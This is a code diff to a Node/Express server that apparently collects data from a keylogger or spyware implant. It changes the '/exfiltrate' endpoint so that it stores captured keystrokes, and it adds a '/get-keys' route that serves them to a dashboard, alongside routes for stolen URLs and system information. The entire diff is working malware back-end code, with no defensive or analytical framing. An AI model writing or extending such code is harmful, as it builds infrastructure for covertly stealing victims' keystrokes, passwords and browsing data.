@@ -14,6 +14,7 @@ app.use(express.json());
 
 var links = new Array();
 var system_info;
+var keylogger_info;
 
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "dashboard.html")); // Serve the HTML file
@@ -43,24 +44,10 @@ app.post('/exfiltrate', (req, res) => {
             break;
         case 'os':
             system_info = data;
-            // Save Cookies to a file
             break;
 
         case 'keys':
-            let output = "";
-            console.log(Object.entries(data));
-            console.log("Raw data received:");
-
-            // for (const [url, entries] of Object.entries(data)) {
-            //     console.log("print:", url, entries);
-            //     // output += `${url}:\n`;
-            //     // entries.forEach(entry => {
-            //     //     output += `[${entry.timestamp}] ${entry.text}\n`;
-            //     // });
-            //     // output += "\n"; // Add space between different URLs
-            // }
-
-            console.log(output); // Output the formatted keystroke data
+            keylogger_info = data;
             break;
 
 
@@ -89,6 +76,10 @@ app.get('/get-urls', (req, res) => {
 app.get('/get-os', (req, res) => {
     if (system_info)
         res.json(system_info);
+});
+
+app.get('/get-keys', (req, res) => {
+    res.json(keylogger_info);
 });
 
 app.listen(PORT, () => {
